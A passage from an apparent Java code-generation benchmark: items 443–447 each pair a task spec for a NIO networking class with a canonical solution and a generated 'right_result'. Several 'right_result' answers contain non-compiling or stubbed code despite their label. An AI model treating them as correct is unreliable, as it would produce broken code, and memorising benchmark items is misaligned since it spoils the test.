if (tail.getLong() != checksum.getValue()) {\n                throw new RuntimeException(\"Data corrupted\");\n            }\n            \n            body.flip();\n            // Process packet here\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                channel.close();\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.capacity();\n    }\n\n    public void stop() {\n        try {\n            if (selector != null) {\n                selector.close();\n            }\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        selector = Selector.open();\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        serverChannel.configureBlocking(false);\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                keys.remove();\n\n                if (!key.isValid()) continue;\n\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                }\n            }\n        }\n    }\n\n    public void stop() {\n        try {\n            serverChannel.close();\n            selector.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        client.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        try {\n            int bytesRead = client.read(buffer);\n            if (bytesRead == -1) {\n                client.close();\n            } else if (isFull(buffer)) {\n                processPacket(buffer.array());\n                buffer.clear();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            try {\n                client.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.limit();\n    }\n\n    private void processPacket(byte[] packet) {\n        // Placeholder for packet processing logic including checksum verification\n        System.out.println(\"Received packet: \" + new String(packet));\n    }\n}\n```"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking TCP server using Java NIO (New I/O) to handle multiple client connections efficiently. The server should accept incoming connections, assign them to processors in a round-robin fashion, and manage connection lifecycle.\n\nClass Description: NIOAcceptor is a thread-based TCP server that uses Java NIO's Selector pattern to handle multiple client connections asynchronously. It creates a ServerSocketChannel, binds it to a specified port, and processes incoming connections by distributing them among available NIOProcessor instances.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\nselector: [Selector] - The NIO selector used to monitor connection events\nserverChannel: [ServerSocketChannel] - The server socket channel that accepts client connections\nfactory: [FrontendConnectionFactory] - Factory for creating FrontendConnection objects\nprocessors: [NIOProcessor[]] - Array of processors for handling client connections\nnextProcessor: [int] - Index of the next processor to be used (round-robin assignment)\nacceptCount: [long] - Counter for accepted connections\n\nMethods:\nrun: [run()] -> [void] - Main thread loop that continuously checks for incoming connections using the selector\naccept: [accept()] -> [void] - Accepts a new client connection, configures it as non-blocking, and assigns it to a processor\nnextProcessor: [nextProcessor()] -> [NIOProcessor] - Returns the next available processor in round-robin fashion\ncloseChannel: [closeChannel(SocketChannel)] -> [void] - Closes the specified socket channel safely\n\nNested Class:\nAcceptIdGenerator: [static class] - Generates unique IDs for accepted connections with thread-safe increment operation\n  - acceptId: [long] - Current ID value\n  - lock: [Object] - Synchronization object\n  - getId: [getId()] -> [long] - Returns and increments the connection ID safely",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOAcceptor extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOAcceptor.class);\n    private static final AcceptIdGenerator ID_GENERATOR = new AcceptIdGenerator();\n\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n\n    public NIOAcceptor(String name, int port, FrontendConnectionFactory factory) throws IOException {\n        super.setName(name);\n        this.port = port;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        this.serverChannel.socket().bind(new InetSocketAddress(port));\n        this.serverChannel.configureBlocking(false);\n        this.serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        this.factory = factory;\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++acceptCount;\n            try {\n                selector.select(1000L);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        if (key.isValid() && key.isAcceptable()) {\n                            accept();\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(getName(), e);\n            }\n        }\n    }\n\n    private void accept() {\n        SocketChannel channel = null;\n        try {\n            channel = serverChannel.accept();\n            channel.configureBlocking(false);\n            FrontendConnection c = factory.make(channel);\n            c.setAccepted(true);\n            c.setId(ID_GENERATOR.getId());\n            NIOProcessor processor = nextProcessor();\n            c.setProcessor(processor);\n            processor.postRegister(c);\n        } catch (Throwable e) {\n            closeChannel(channel);\n            LOGGER.warn(getName(), e);\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static void closeChannel(SocketChannel channel) {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private static class AcceptIdGenerator {\n        private static final long MAX_VALUE = 0xffffffffL;\n        private long acceptId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (acceptId >= MAX_VALUE) {\n                    acceptId = 0L;\n                }\n                return ++acceptId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NIOAcceptor {\n    private int port;\n    private Selector selector;\n    private ServerSocketChannel serverChannel;\n    private FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor = 0;\n    private long acceptCount = 0;\n\n    public NIOAcceptor(int port, FrontendConnectionFactory factory, int numProcessors) throws IOException {\n        this.port = port;\n        this.factory = factory;\n        this.processors = new NIOProcessor[numProcessors];\n        for (int i = 0; i < numProcessors; i++) {\n            processors[i] = new NIOProcessor();\n        }\n        selector = Selector.open();\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        serverChannel.configureBlocking(false);\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    if (key.isAcceptable()) {\n                        accept();\n                    }\n                    keys.remove();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void accept() {\n        try {\n            SocketChannel clientChannel = serverChannel.accept();\n            clientChannel.configureBlocking(false);\n            NIOProcessor processor = nextProcessor();\n            processor.addConnection(clientChannel);\n            nextProcessor++;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        return processors[nextProcessor++ % processors.length];\n    }\n\n    private void closeChannel(SocketChannel channel) {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    static class AcceptIdGenerator {\n        private static long acceptId = 0;\n        private static final Object lock = new Object();\n\n        public static long getId() {\n            synchronized (lock) {\n                return ++acceptId;\n            }\n        }\n    }\n}\n\nclass NIOProcessor {\n    private ByteBuffer buffer = ByteBuffer.allocate(1024);\n\n    public void addConnection(SocketChannel channel) {\n        try {\n            channel.register(SelectorProvider.getProvider().openSelector(), SelectionKey.OP_READ, buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processEvents(Selector selector) {\n        try {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                if (key.isReadable()) {\n                    read(key);\n                }\n                keys.remove();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void read(SelectionKey key) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        buffer.clear();\n        try {\n            int bytesRead = channel.read(buffer);\n            if (bytesRead == -1) {\n                channel.close();\n            } else {\n                buffer.flip();\n                // Process data here\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            try {\n                channel.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n}\n\ninterface FrontendConnectionFactory {\n    FrontendConnection createConnection(SocketChannel channel);\n}\n```"
  },
  {
    "Task_id": 444,
    "Instruction": "Task Description: Create a Java class that implements UDP-based communication for sending metrics to a Graphite server using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The GraphiteUDP class provides functionality to connect to a Graphite server via UDP, send metric data in the correct format, and handle connection management. It implements non-blocking UDP communication using Java NIO's DatagramChannel and includes error tracking and resource cleanup.\n\nAttributes:\n- hostname: [String] - The hostname of the Graphite server\n- port: [int] - The port number of the Graphite server\n- address: [InetSocketAddress] - The resolved socket address of the Graphite server\n- datagramChannel: [DatagramChannel] - The NIO channel used for UDP communication\n- failures: [int] - Counter for tracking failed send attempts\n\nMethods:\n- connect(): [void] -> [void] - Establishes a connection to the Graphite server by opening a DatagramChannel\n- isConnected(): [void] -> [boolean] - Checks if the connection to the Graphite server is active\n- send(): [String name, String value, long timestamp] -> [void] - Formats and sends a metric to the Graphite server\n- getFailures(): [void] -> [int] - Returns the count of failed send attempts\n- flush(): [void] -> [void] - Placeholder method (no action needed for UDP)\n- close(): [void] -> [void] - Closes the DatagramChannel and cleans up resources\n- sanitize(): [String s] -> [String] - Sanitizes metric names and values (delegates to GraphiteSanitize)\n- getDatagramChannel(): [void] -> [DatagramChannel] - Returns the current DatagramChannel instance\n- setDatagramChannel(): [DatagramChannel datagramChannel] -> [void] - Sets the DatagramChannel instance\n- getAddress(): [void] -> [InetSocketAddress] - Returns the current target address\n- setAddress(): [InetSocketAddress address] -> [void] - Sets the target address",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class GraphiteUDP implements GraphiteSender {\n\n    private final String hostname;\n    private final int port;\n    private InetSocketAddress address;\n\n    private DatagramChannel datagramChannel = null;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = null;\n    }\n\n    public GraphiteUDP(InetSocketAddress address) {\n        this.hostname = null;\n        this.port = -1;\n        this.address = address;\n    }\n\n    @Override\n    public void connect() throws IllegalStateException, IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n\n        if (hostname != null) {\n            address = new InetSocketAddress(InetAddress.getByName(hostname), port);\n        }\n\n        datagramChannel = DatagramChannel.open();\n    }\n\n    @Override\n    public boolean isConnected() {\n        return datagramChannel != null && !datagramChannel.socket().isClosed();\n    }\n\n    @Override\n    public void send(String name, String value, long timestamp) throws IOException {\n        try {\n            String str = sanitize(name) + ' ' + sanitize(value) + ' ' + Long.toString(timestamp) + '\\n';\n            ByteBuffer byteBuffer = ByteBuffer.wrap(str.getBytes(UTF_8));\n            datagramChannel.send(byteBuffer, address);\n            this.failures = 0;\n        } catch (IOException e) {\n            failures++;\n            throw e;\n        }\n    }\n\n    @Override\n    public int getFailures() {\n        return failures;\n    }\n\n    @Override\n    public void flush() throws IOException {\n        // Nothing to do\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (datagramChannel != null) {\n            try {\n                datagramChannel.close();\n            } finally {\n                datagramChannel = null;\n            }\n        }\n    }\n\n    protected String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    InetSocketAddress getAddress() {\n        return address;\n    }\n\n    void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class GraphiteUDP {\n    private String hostname;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel datagramChannel;\n    private int failures = 0;\n\n    public void connect() throws IOException {\n        this.address = new InetSocketAddress(hostname, port);\n        this.datagramChannel = DatagramChannel.open();\n        this.datagramChannel.configureBlocking(false);\n    }\n\n    public boolean isConnected() {\n        return datagramChannel != null && datagramChannel.isOpen();\n    }\n\n    public void send(String name, String value, long timestamp) {\n        try {\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put(sanitize(name).getBytes());\n            buffer.put(\" \".getBytes());\n            buffer.put(value.getBytes());\n            buffer.put(\" \".getBytes());\n            buffer.put(Long.toString(timestamp).getBytes());\n            buffer.flip();\n            datagramChannel.send(buffer, address);\n        } catch (IOException e) {\n            failures++;\n        }\n    }\n\n    public int getFailures() {\n        return failures;\n    }\n\n    public void flush() {}\n\n    public void close() {\n        if (datagramChannel != null && datagramChannel.isOpen()) {\n            try {\n                datagramChannel.close();\n            } catch (IOException e) {}\n        }\n    }\n\n    private String sanitize(String s) {\n        // Delegate sanitization logic to GraphiteSanitize\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    public DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    public void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    public InetSocketAddress getAddress() {\n        return address;\n    }\n\n    public void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}\n```"
  },
  {
    "Task_id": 445,
    "Instruction": "Task Description: Implement a Java class for UDP-based communication with OpenTracker for live synchronization of peer information using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The OpentrackerLiveSync class handles UDP communication with an OpenTracker server for peer synchronization. It uses non-blocking I/O to send peer information packets to a multicast group. The class maintains a queue of outgoing messages and processes them in batches.\n\nAttributes:\n- toSend: TransferQueue<ByteBuffer> - Thread-safe queue holding outgoing peer information packets\n- channel: DatagramChannel - The UDP communication channel for sending data\n- id: byte[] - 4-byte random identifier for this client\n- running: volatile boolean - Flag controlling the operation of the sender thread\n- HEADER_LENGTH: static final int - Constant for header size (8 bytes)\n- PEER_LENGTH: static final int - Constant for peer information size (28 bytes)\n- PEERS_PER_PACKET: static final int - Constant for maximum peers per packet (50)\n\nMethods:\n- OpentrackerLiveSync() -> None - Constructor initializes random client ID\n- start() -> None - Initializes UDP channel and starts sender thread\n- incomingPacket(MessageBase msg) -> None - Processes incoming messages and queues valid peer requests\n- send() -> None - Worker method that sends batched peer information packets\n- stop() -> None - Stops the sender thread and closes the channel\n\nInput Parameters for Methods:\n- incomingPacket: msg [MessageBase] - The incoming message to process\n- (Other methods take no explicit parameters)\n\nOutput/Return Values:\n- All methods return void except the constructor\n- Methods primarily affect class state and perform I/O operations",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Inet4Address;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.concurrent.LinkedTransferQueue;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TransferQueue;\n\npublic class OpentrackerLiveSync {\n\n    TransferQueue<ByteBuffer> toSend = new LinkedTransferQueue<>();\n    DatagramChannel channel;\n    byte[] id = new byte[4];\n    volatile boolean running = true;\n    \n    private static final int HEADER_LENGTH = 0x08;\n    private static final int PEER_LENGTH = 0x1C;\n    private static final int PEERS_PER_PACKET = 50;\n    \n    public OpentrackerLiveSync() {\n        ThreadLocalRandom.current().nextBytes(id);\n    }\n    \n    public void start() {\n        try {\n            channel = DatagramChannel.open(StandardProtocolFamily.INET);\n            channel.setOption(StandardSocketOptions.IP_MULTICAST_TTL, 1);\n            channel.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n            channel.bind(new InetSocketAddress(0));\n            channel.connect(new InetSocketAddress(InetAddress.getByAddress(new byte[] {(byte) 224,0,23,5}), 9696));\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n        \n        Thread t = new Thread(this::send);\n        t.setDaemon(true);\n        t.setName(\"opentracker-sync\");\n        t.start();\n    }\n    \n    public void incomingPacket(MessageBase msg) {\n        if(!running)\n            return;\n        if(msg.getType() != MessageBase.Type.REQ_MSG || msg.getMethod() != MessageBase.Method.GET_PEERS)\n            return;\n        \n        GetPeersRequest req = (GetPeersRequest) msg;\n        \n        ByteBuffer buf = ByteBuffer.allocate(PEER_LENGTH);\n        buf.put(req.getTarget().getHash());\n        buf.put(req.getOrigin().getAddress().getAddress());\n        buf.putShort((short) req.getOrigin().getPort());\n        buf.putShort((short) 0);\n        buf.flip();\n        toSend.add(buf);\n    }\n    \n    void send() {\n        ByteBuffer sendBuffer = ByteBuffer.allocate(HEADER_LENGTH);\n        sendBuffer.put(id);\n        sendBuffer.put(new byte[4]);\n        sendBuffer.flip();\n        \n        ByteBuffer[] buffers = new ByteBuffer[1 + PEERS_PER_PACKET];\n        buffers[0] = sendBuffer;\n\n        try {\n            while(running) {\n                for(int i = 1;i<buffers.length;i++) {\n                    buffers[i] = toSend.take();\n                }\n                \n                channel.write(buffers);\n                buffers[0].rewind();\n            }\n        } catch (IOException | InterruptedException e) {\n            running = false;\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            channel.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.concurrent.LinkedBlockingTransferQueue;\n\npublic class OpentrackerLiveSync {\n    private TransferQueue<ByteBuffer> toSend = new LinkedBlockingTransferQueue<>();\n    private DatagramChannel channel;\n    private byte[] id = generateRandomId();\n    private volatile boolean running = true;\n    private static final int HEADER_LENGTH = 8;\n    private static final int PEER_LENGTH = 28;\n    private static final int PEERS_PER_PACKET = 50;\n\n    public OpentrackerLiveSync() {}\n\n    public void start() throws Exception {\n        channel = DatagramChannel.open().bind(null);\n        channel.configureBlocking(false);\n        new Thread(this::send).start();\n    }\n\n    public void incomingPacket(MessageBase msg) {\n        // Process incoming messages and queue valid peer requests\n    }\n\n    private void send() {\n        while (running) {\n            try {\n                ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + PEER_LENGTH * Math.min(toSend.size(), PEERS_PER_PACKET));\n                buffer.putInt(buffer.capacity());\n                while (buffer.hasRemaining() && !toSend.isEmpty()) {\n                    buffer.put(toSend.take());\n                }\n                buffer.flip();\n                channel.send(buffer, new InetSocketAddress(\"multicast.group.address\", 12345));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void stop() throws Exception {\n        running = false;\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private byte[] generateRandomId() {\n        byte[] id = new byte[4];\n        new java.util.Random().nextBytes(id);\n        return id;\n    }\n}\n```"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking UDP sender using Java NIO's DatagramChannel for asynchronous communication.\n\nClass Description: The Sender class provides functionality to establish a non-blocking UDP connection, send data packets to a specified host and port, and manage the connection lifecycle. It uses Java NIO's DatagramChannel for efficient network communication.\n\nAttributes:\n- host: [String] - The target hostname or IP address for UDP communication\n- port: [int] - The target port number for UDP communication\n- address: [InetSocketAddress] - The socket address combining host and port for the target\n- channel: [DatagramChannel] - The NIO channel used for UDP communication\n\nMethods:\n- connect(): [void] -> [void] - Opens a DatagramChannel and prepares it for communication. Throws IOException if connection fails and IllegalStateException if already connected.\n- isConnected(): [void] -> [boolean] - Checks if the channel is currently connected and not closed.\n- send(ByteBuffer buffer): [ByteBuffer] -> [void] - Sends the contents of the provided ByteBuffer to the target address. Throws IOException if sending fails.\n- disconnect(): [void] -> [void] - Closes the DatagramChannel and releases resources. Safe to call even if not connected.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n\n    private final String host;\n    private final int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        if (host != null) {\n            address = new InetSocketAddress(host, port);\n        }\n        channel = DatagramChannel.open();\n    }\n\n    public boolean isConnected() {\n        return channel != null && !channel.socket().isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() throws IOException {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } finally {\n            channel = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n    private String host;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.address = new InetSocketAddress(host, port);\n        this.channel = null;\n    }\n\n    public void connect() throws IOException {\n        if (channel != null && channel.isOpen()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        channel = DatagramChannel.open();\n        channel.configureBlocking(false);\n    }\n\n    public boolean isConnected() {\n        return channel != null && channel.isOpen();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        if (!isConnected()) {\n            throw new IllegalStateException(\"Not connected\");\n        }\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() {\n        if (channel != null && channel.isOpen()) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Create a Java class that implements a multicast sender using UDP with Java NIO's DatagramChannel for non-blocking communication. The class should support both IPv4 and IPv6 protocols and allow sending messages to a multicast group.\n\nClass Description: The MulticastSender class is responsible for sending messages to a multicast group using UDP. It utilizes Java NIO's DatagramChannel for efficient non-blocking communication and supports configuration of TTL (Time To Live) for multicast packets. The class handles both IPv4 and IPv6 protocols automatically based on the system's IP stack type.\n\nAttributes:\n- sock: [DatagramSocket] - The underlying DatagramSocket used for communication\n- mcast_addr: [InetAddress] - The multicast address to send messages to\n- bind_addr: [InetAddress] - The local address to bind to\n- mcast_port: [int] - The multicast port number\n- local_port: [int] - The local port number to bind to\n- ttl: [int] - Time To Live for multicast packets\n- prot_family: [ProtocolFamily] - The protocol family (INET or INET6) determined by the system's IP stack\n\nMethods:\n- MulticastSender: [Constructor](InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) -> [void] - Initializes the multicast sender with binding address, ports, multicast address, and TTL\n- start: [start]() -> [void] - Starts the sender, binds to the specified address and port, and begins reading input from stdin to send as multicast messages\n- bindToInterfaces: [bindToInterfaces](List<NetworkInterface> interfaces, MulticastSocket s) -> [void] - Helper method to bind multicast socket to multiple network interfaces (currently unused in main flow)",
    "Canonical_solution": "import org.jgroups.util.StackType;\nimport org.jgroups.util.Util;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.channels.DatagramChannel;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class MulticastSender {\n    protected DatagramSocket sock;\n    protected InetAddress mcast_addr;\n    protected InetAddress bind_addr;\n    protected int mcast_port;\n    protected final int local_port;\n    protected final int ttl;\n    protected static final ProtocolFamily prot_family;\n\n    static {\n        StackType ip_version = Util.getIpStackType();\n        prot_family = ip_version == StackType.IPv6 ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n    }\n\n    public void start() throws Exception {\n        DatagramChannel channel = null;\n        try {\n            channel = DatagramChannel.open(prot_family)\n                    .setOption(StandardSocketOptions.IP_MULTICAST_TTL, ttl)\n                    .bind(new InetSocketAddress(bind_addr, local_port));\n            sock = channel.socket();\n\n            DataInputStream in = new DataInputStream(System.in);\n            while(true) {\n                System.out.print(\"> \");\n                try {\n                    String line = Util.readLine(in);\n                    byte[] buf = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(buf, buf.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n                catch(Throwable t) {\n                    t.printStackTrace();\n                }\n            }\n        }\n        finally {\n            if(channel != null)\n                channel.close();\n        }\n    }\n\n    protected void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        SocketAddress tmp_mcast_addr = new InetSocketAddress(mcast_addr, mcast_port);\n        for(NetworkInterface intf: interfaces) {\n            try {\n                s.joinGroup(tmp_mcast_addr, intf);\n            }\n            catch(IOException e) {\n                System.err.printf(\"failed joining interface %s: %s\\n\", intf, e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.NetworkInterface;\nimport java.net.ProtocolFamily;\nimport java.net.SocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.List;\n\npublic class MulticastSender {\n    private DatagramChannel sock;\n    private InetAddress mcast_addr;\n    private InetAddress bind_addr;\n    private int mcast_port;\n    private int local_port;\n    private int ttl;\n    private ProtocolFamily prot_family;\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) throws IOException {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n        this.prot_family = bind_addr instanceof java.net.Inet6Address ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n        this.sock = DatagramChannel.open(prot_family).socket();\n        sock.setReuseAddress(true);\n        sock.bind(new java.net.InetSocketAddress(bind_addr, local_port));\n    }\n\n    public void start() throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        while (true) {\n            System.out.print(\"Enter message to send: \");\n            String line = System.console().readLine();\n            if (\"exit\".equalsIgnoreCase(line)) break;\n            buffer.clear();\n            buffer.put(line.getBytes());\n            buffer.flip();\n            sock.send(buffer, new java.net.InetSocketAddress(mcast_addr, mcast_port));\n        }\n    }\n\n    public void bindToInterfaces(List<NetworkInterface> interfaces, DatagramSocket s) throws IOException {\n        // Implementation of binding to multiple interfaces is currently unused\n    }\n\n    public static void main(String[] args) {\n        try {\n            InetAddress bind_addr = InetAddress.getByName(\"0.0.0.0\");\n            InetAddress mcast_addr = InetAddress.getByName(\"239.255.255.250\");\n            int local_port = 5007;\n            int mcast_port = 5007;\n            int ttl = 1;\n            MulticastSender sender = new MulticastSender(bind_addr, local_port, mcast_addr, mcast_port, ttl);\n            sender.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 448,
